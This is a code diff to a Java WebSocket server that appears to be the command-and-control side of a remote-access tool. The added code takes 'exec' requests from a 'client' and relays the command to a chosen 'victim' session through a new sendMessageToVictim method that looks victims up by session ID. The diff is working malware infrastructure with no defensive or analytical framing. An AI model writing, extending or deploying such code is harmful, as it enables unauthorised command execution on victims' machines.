@@ -74,6 +74,10 @@ public class WebSocketServer {
                 }
             } else if (type.equals("exec")) {
                 logger.info("execute command"+" client:"+jsonNode.get("client")+" victim:"+jsonNode.get("victim")+" command:"+jsonNode.get("command"));
+                if(jsonNode.get("state").asText().equals("req")){
+                    logger.info("req came");
+                    sendMessageToVictim(jsonNode.get("victim").asText(),commands.sendVictimExec(jsonNode.get("client").asText(),jsonNode.get("command").asText()));
+                }
             }
 
         } catch (Exception e) {
@@ -97,6 +101,23 @@ public class WebSocketServer {
     public void send(Session session,Object msg) throws IOException {
         session.getBasicRemote().sendText((String) msg);
     }
+
+    public void sendMessageToVictim(String sessionId, String message) {
+        try {
+            for (Session victim : victims) {
+                if (victim.getId().equals(sessionId)) {
+                    victim.getBasicRemote().sendText(message);
+                    logger.info("Message sent to victim with sessionId: " + sessionId);
+                    return; // Exit once the message is sent
+                }
+            }
+            logger.warning("No victim found with sessionId: " + sessionId);
+        } catch (IOException e) {
+            logger.severe("Error sending message to victim with sessionId: " + sessionId);
+            e.printStackTrace();
+        }
+    }
+
 
 }
 
